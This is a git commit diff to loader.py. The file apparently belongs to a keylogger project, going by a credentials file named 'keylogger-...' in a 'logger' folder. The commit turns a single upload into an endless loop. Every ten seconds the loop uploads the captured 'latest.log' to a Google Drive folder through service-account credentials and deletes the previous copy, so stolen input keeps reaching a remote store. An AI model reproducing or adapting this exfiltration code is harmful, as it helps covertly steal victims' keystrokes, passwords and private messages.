73fccf3b3e62facbc86d23f476b51d94ca367ef0
zazaza5817 <49568244+zazaza5817@users.noreply.github.com>
2020-07-10 13:29:09 +0300

    Update loader.py

--- loader.py
+++ loader.py
@@ -1,8 +1,8 @@
 from google.oauth2 import service_account
-from googleapiclient.http import MediaIoBaseDownload,MediaFileUpload
+from googleapiclient.http import MediaFileUpload
 from googleapiclient.discovery import build
 import pprint
-import io
+import time
 
 pp = pprint.PrettyPrinter(indent=4)
 
@@ -11,17 +11,22 @@ SERVICE_ACCOUNT_FILE = 'C:/Users/nikot/Desktop/logger/keylogger-282819-7c70753b5
 credentials = service_account.Credentials.from_service_account_file(
         SERVICE_ACCOUNT_FILE, scopes=SCOPES)
 service = build('drive', 'v3', credentials=credentials)
-results = service.files().list(pageSize=10,
-                               fields="nextPageToken, files(id, name, mimeType)").execute()
-pp.pprint(results)
+# results = service.files().list(pageSize=10,
+#                                fields="nextPageToken, files(id, name, mimeType)").execute()
+# pp.pprint(results)
+last_id = 0
 
-folder_id = '1KrHbzTNzYN__XogOqaeUeDo0nkxWqkcN'
-name = 'latest.log'
-file_path = 'C:/Users/nikot/Desktop/logger/latest.log'
-file_metadata = {
-                'name': name,
-                'parents': [folder_id]
-            }
-media = MediaFileUpload(file_path, resumable=True)
-r = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
-pp.pprint(r)
+while True:
+    folder_id = '1KrHbzTNzYN__XogOqaeUeDo0nkxWqkcN'
+    name = 'latest.log'
+    file_path = 'C:/Users/nikot/Desktop/logger/latest.log'
+    file_metadata = {
+                    'name': name,
+                    'parents': [folder_id]
+                }
+    media = MediaFileUpload(file_path, resumable=True)
+    r = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+    if last_id != 0:
+        service.files().delete(fileId=last_id).execute()
+    last_id = r['id']
+    time.sleep(10)
